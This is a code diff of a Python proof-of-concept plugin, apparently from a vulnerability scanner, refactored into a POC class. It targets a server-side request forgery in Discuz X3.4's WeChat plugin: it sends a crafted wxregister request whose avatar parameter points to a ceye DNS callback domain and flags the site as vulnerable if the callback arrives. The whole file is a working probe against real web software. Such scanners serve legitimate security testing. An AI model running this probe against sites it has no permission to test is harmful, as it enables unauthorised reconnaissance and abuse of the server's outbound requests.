@@ -2,40 +2,36 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-'''
-https://zhuanlan.zhihu.com/p/51907363
-https://www.seebug.org/vuldb/ssvid-97709
-'''
-
 import time
 import random
 from string import ascii_lowercase
+from script import Script, SERVER_PORT_MAP
 
-def info(data):
-    info = {
-        "name": "discuz x3.4 ssrf",
-        "info": "discuz x3.4 ssrf",
-        "level": "high",
-        "type": "ssrf",
-    }
-    return info
+class POC(Script):
+    def __init__(self, target=None):
+        self.server_type = SERVER_PORT_MAP.WEB
+        self.name = 'discuz x3.4 ssrf'
+        self.keyword = ['discuz']
+        self.info = 'discuz x3.4 ssrf'
+        self.type = 'ssrf'
+        self.level = 'high'
+        self.refer = 'https://zhuanlan.zhihu.com/p/51907363, https://www.seebug.org/vuldb/ssvid-97709'
+        Script.__init__(self, target=target, server_type=self.server_type)
 
-def prove(data):
-    init(data,'discuz')
-    if data['base_url']:
-        dns = ceye_dns_api()
-        url = data[
-                  'base_url'] + "plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=%s&wxopenid=%s" %(dns,''.join([random.choice(ascii_lowercase) for _ in range(8)]))
-        res = curl('get', url)
-        if res != None :
-            time.sleep(3)
-            if ceye_verify_api(dns,'http'):
-                data['flag'] = 1
-                data['data'].append({"flag": url})
-                data['res'].append({"info": url, "key": "discuz x3.4 ssrf"})
-    return data
-
-
-if __name__=='__main__':
-    from script import init, curl,ceye_verify_api,ceye_dns_api
-    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))
+    def prove(self):
+        self.get_url()
+        if self.base_url:
+            path_list = list(set([
+                self.url_normpath(self.base_url, '/'),
+                self.url_normpath(self.url, './'),
+            ]))
+            for path in path_list:
+                dns = self.ceye_dns_api()
+                url = path + "/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=%s&wxopenid=%s" %(dns,''.join([random.choice(ascii_lowercase) for _ in range(8)]))
+                res = self.curl('get', url)
+                if res != None :
+                    time.sleep(3)
+                    if self.ceye_verify_api(dns,'http'):
+                        self.flag = 1
+                        self.req.append({"flag": url})
+                        self.res.append({"info": url, "key": "discuz x3.4 ssrf"})
